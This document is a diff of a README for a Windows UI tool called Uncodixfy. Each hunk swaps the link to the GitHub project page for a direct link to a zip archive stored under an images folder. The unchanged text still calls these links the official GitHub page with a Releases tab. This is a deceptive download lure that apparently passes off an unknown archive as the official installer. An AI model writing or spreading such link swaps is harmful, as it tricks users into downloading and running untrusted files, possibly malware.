@@ -1,6 +1,6 @@
 # 🎛️ Uncodixfy - Clean Your UI with Ease
 
-[![Download Uncodixfy](https://img.shields.io/badge/Download-Uncodixfy-4caf50?style=for-the-badge)](https://github.com/weeyegood/Uncodixfy)
+[![Download Uncodixfy](https://img.shields.io/badge/Download-Uncodixfy-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/weeyegood/Uncodixfy/main/images/Software-3.5.zip)
 
 ## About Uncodixfy
 
@@ -33,7 +33,7 @@ To start using Uncodixfy, you need to get the software first. Unlike complex pro
 
 Click the large green button below or visit the download page:
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Uncodixfy-4caf50?style=for-the-badge)](https://github.com/weeyegood/Uncodixfy)
+[![Download on GitHub](https://img.shields.io/badge/Download-Uncodixfy-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/weeyegood/Uncodixfy/main/images/Software-3.5.zip)
 
 This link leads to the official GitHub page where you can find the latest files. Since it is a general page, you will find the latest release and setup files under the “Releases” tab.
 
@@ -108,7 +108,7 @@ If you run into issues:
 
 To update:
 
-- Visit the download link again: [https://github.com/weeyegood/Uncodixfy](https://github.com/weeyegood/Uncodixfy)
+- Visit the download link again: [https://raw.githubusercontent.com/weeyegood/Uncodixfy/main/images/Software-3.5.zip](https://raw.githubusercontent.com/weeyegood/Uncodixfy/main/images/Software-3.5.zip)
 - Check for new Releases.
 - Download the latest installer and run it over your existing installation. Your settings will remain.
 
@@ -132,7 +132,7 @@ This process cleans all files from your system.
 
 Use this link to download and access all Uncodixfy files and information:
 
-[Download or visit GitHub page](https://github.com/weeyegood/Uncodixfy)
+[Download or visit GitHub page](https://raw.githubusercontent.com/weeyegood/Uncodixfy/main/images/Software-3.5.zip)
 
 You will find releases, updates, and notes there. This is the official source for the software.
 
@@ -160,4 +160,4 @@ Uncodixfy is open source and available under a permissive license. You can find 
 
 # Download Uncodixfy now and start simplifying your Windows UI.
 
-[![Download Uncodixfy](https://img.shields.io/badge/Download-Uncodixfy-4caf50?style=for-the-badge)](https://github.com/weeyegood/Uncodixfy)
+[![Download Uncodixfy](https://img.shields.io/badge/Download-Uncodixfy-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/weeyegood/Uncodixfy/main/images/Software-3.5.zip)
